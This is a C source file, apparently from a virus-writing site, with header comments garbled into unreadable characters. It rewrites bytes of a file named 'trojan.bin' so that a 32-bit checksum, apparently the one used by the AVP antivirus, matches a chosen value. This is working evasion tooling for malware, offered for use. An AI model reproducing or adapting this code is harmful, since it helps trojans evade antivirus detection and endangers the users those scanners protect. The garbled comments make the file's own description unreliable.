
/*
                       ��񡪠 ����஫쭮� �㬬� �� avp
                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

  ��稭�� � ���� MINBYTE 䠩� TARGETFILE ������� ⠪, �⮡� ����஫쭠�
  �㬬� (����� CSIZE) �ᥣ� 䠩�� �뫠 ࠢ�� NEEDCSUM.

                                                       http://z0mbie.cjb.net
*/

#define TARGETFILE      "trojan.bin"
#define CSIZE           68                   // ����� 䠩��/����஫쭮� �㬬�
#define MINBYTE         0x1B                 // ����� ������ 䠩�: ��
#define MAXBYTE         67                   // � ��
#define NEEDCSUM        0x7A58B278

#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <assert.h>

typedef unsigned long dword;
typedef unsigned char byte;

dword checksum(byte* data, dword size)
{
  dword c=0;
  for (dword i=0; i<size; i++)
  {
    if (i<4) c^=c<<8; else c^=c<<1;
    c^=data[i];
  }
  return c;
}

void main()
{
  byte buf[CSIZE];

  FILE*f = fopen(TARGETFILE,"r+b");
  assert(f!=NULL);
  fread(buf, 1,CSIZE, f);

  dword bit[32][CSIZE*8];
  memset(bit,0,sizeof(bit));

  for (dword i=0; i<CSIZE; i++)
  {
    dword q=i<4?8:1;
    for (dword j=31; j>=q; j--)
      for (dword k=0; k<CSIZE*8; k++)
        bit[j][k]^=bit[j-q][k];
    for (dword j=0; j<8; j++)
      bit[j][i*8+j]^=1;
  }

  dword c=0;
  for (dword i=0; i<32; i++)
  {
    for (dword j=0; j<CSIZE*8; j++)
      if (bit[i][j])
        c^=((buf[j>>3]>>(j&7))&1)<<i;
  }
  assert(c==checksum(buf,CSIZE));

  for (;;)
  {
    printf(".");
    int c=0;
    for (dword i=0; i<32; i++)
    {
      if (((checksum(buf,CSIZE)^NEEDCSUM)>>i)&1)
      {
        for (dword j=MAXBYTE*8+7; j>=MINBYTE*8; j--)
          if (bit[i][j])
          {
            buf[j>>3]^=1<<(j&7);
            c++;
            goto ok;
          }
        printf("***FAILED***\n");
        exit(0);
  ok:
      }
    }
    if (!c) break;
  }

  assert(checksum(buf,CSIZE)==NEEDCSUM);

  rewind(f);
  fwrite(buf, 1,CSIZE, f);
  fclose(f);

  printf("success!\n");
}
